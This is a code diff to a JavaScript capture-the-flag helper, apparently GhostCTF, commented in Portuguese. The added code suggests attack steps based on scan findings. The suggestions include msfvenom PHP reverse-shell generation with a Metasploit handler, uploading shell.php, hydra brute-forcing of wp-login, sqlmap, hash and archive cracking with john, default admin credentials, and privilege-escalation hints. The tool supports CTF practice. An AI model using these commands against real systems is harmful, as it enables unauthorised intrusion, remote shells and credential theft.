@@ -89,6 +89,21 @@ export function buildCtfPlaybookSuggestions({ ip, findings }) {
     ], 'high');
   }
 
+  if (has(8161) || ports.some((p) => p.port === 8161)) {
+    emit('ActiveMQ (8161) → consola web e túnel SSH', [
+      `curl -sS http://${ip}:8161/ | head`,
+      `# se só escutar em localhost no alvo: ssh -L 8162:127.0.0.1:8161 user@${ip}`,
+      `# depois browser em http://127.0.0.1:8162/ — pesquisar CVE (ex.: OpenWire 2023-46604) pela versão`,
+    ], 'high');
+  }
+
+  if (has(3000) || ports.some((p) => p.port === 3000)) {
+    emit('Porta 3000 (Node/React) → fuzz com Host / paths', [
+      `# Node com vhost: ffuf -u http://${ip}:3000/FUZZ -w <wordlist> -H "Host: app.alvo.ctf" -mc 200,204,301,302,401,403`,
+      `curl -sS -i http://${ip}:3000/ -H "Host: <nome-do-desafio>"`,
+    ], 'med');
+  }
+
   // ── Web hints ───────────────────────────────────
   const urls = uniq(endpoints.map((f) => f.url || '').filter((u) => /^https?:\/\//i.test(u)));
   if (urls.length) {
@@ -97,6 +112,19 @@ export function buildCtfPlaybookSuggestions({ ip, findings }) {
       `# robots/sitemap: /robots.txt /sitemap.xml`,
       `# procurar flag: view-source + grep Solyd{ / HTB{ / GCTF{`,
       `# dir enum: ffuf -u ${urls[0].replace(/\/$/, '')}/FUZZ -w <wordlist> -mc 200,204,301,302,307,401,403`,
+    ], 'high');
+  }
+
+  const hasUploadSurface = (findings || []).some((f) =>
+    /possível upload de ficheiro/i.test(safeToString(f?.value)),
+  );
+  if (hasUploadSurface) {
+    emit('Superfície de upload (HTML) → payload + confirmação manual', [
+      '# UI GhostCTF: Wandenreich — LHOST/LPORT, gravar em payloads/ ou ngrok; Msfvenom (manual) para CLI',
+      '# Kali (se tiveres msfvenom): msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o shell.php',
+      '# Handler: msfconsole -q -x "use exploit/multi/handler; set payload php/reverse_php; set LHOST IP; set LPORT PORT; exploit -j"',
+      '# Upload no browser no formulário ou: curl -k -F "campo=@shell.php" URL_DO_ACTION (ajusta nome do campo)',
+      '# Confirmar pasta de uploads e se .php é executado (nem sempre é RCE)',
     ], 'high');
   }
 
@@ -132,6 +160,46 @@ export function buildCtfPlaybookSuggestions({ ip, findings }) {
     ], 'high');
   }
 
+  const blobAll = (findings || [])
+    .map((f) => `${safeToString(f?.value)} ${safeToString(f?.meta)} ${safeToString(f?.url)}`)
+    .join(' ')
+    .toLowerCase();
+  if (/\bws:\/\//.test(blobAll) || /websocket/i.test(blobAll)) {
+    emit('WebSocket + SQLi → sqlmap em ws://', [
+      '# exemplo: sqlmap -u "ws://host:port/caminho" --data \'{\"id\":\"*\"}\' --batch --dbs',
+      '# ajustar JSON ao protocolo real (campo injectável com *)',
+    ], 'med');
+  }
+
+  if (/wp-config|db_user|db_password/i.test(blobAll)) {
+    emit('wp-config / creds DB → MariaDB no CTF', [
+      '# com DB_HOST=localhost no servidor: SSH primeiro, depois mysql -u DB_USER -p',
+      '# com DB_HOST apontando a IP interno: testar mysql -h <host> -u ... desde a rede permitida',
+      '# procurar flags/tabelas: SHOW DATABASES; USE <db>; SHOW TABLES;',
+    ], 'high');
+  }
+
+  if (/\b[a-f0-9]{32}\b/i.test(blobAll)) {
+    emit('Hashes MD5 (32 hex) em página → lookup rápido', [
+      '# CrackStation / hashes.com (só para hashes públicas conhecidas)',
+      '# local: john --format=raw-md5 hash.txt --wordlist=<wl>',
+    ], 'low');
+  }
+
+  if (/\.zip\b|application\/zip|pdf|application\/pdf/i.test(blobAll)) {
+    emit('Arquivos ZIP / PDF protegidos → john auxiliares', [
+      '# ZIP: zip2john ficheiro.zip > zip.hash && john zip.hash --wordlist=<wl>',
+      '# PDF: pdf2john ficheiro.pdf > pdf.hash && john pdf.hash --wordlist=<wl>',
+    ], 'med');
+  }
+
+  if (/tiny\s*file\s*manager|tinyfilemanager/i.test(blobAll)) {
+    emit('Tiny File Manager → credenciais CTF comuns', [
+      '# tentar painel: admin / admin@123 (e variações) antes de brute pesado',
+      '# após login: procurar ficheiros de config, backups, chaves',
+    ], 'med');
+  }
+
   const hasFtpAnonymous = endpointFindings.some((e) => /ftp anonymous permitido/i.test(`${e.value} ${e.meta}`));
   if (hasFtpAnonymous) {
     emit('FTP anonymous confirmado → sequência de enum + pivot', [
@@ -161,7 +229,16 @@ export function buildCtfPlaybookSuggestions({ ip, findings }) {
       '# validar xmlrpc exposto (e vetores associados) antes de brute force',
       '# mapear plugins para CVE por versão (priorizar plugins já detectados)',
       '# testar credential reuse (wp-login/ftp/ssh/mysql) com credenciais extraídas',
+      '# brute limitado: hydra -L users.txt -P wl.txt site http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=Incorrect"',
     ], 'high');
+  }
+
+  if (has(22)) {
+    emit('Pós-shell SSH → privesc típico CTF', [
+      '# linpeas.sh ou lse.sh (rever SUID, cron, capabilities, kernel)',
+      '# sudo -l — atenção a GTFOBins (ex.: apt, vim, find)',
+      '# doas -l; verificar dstat (CVE-2021-3869) se aparecer em cron',
+    ], 'low');
   }
 
   // fallback
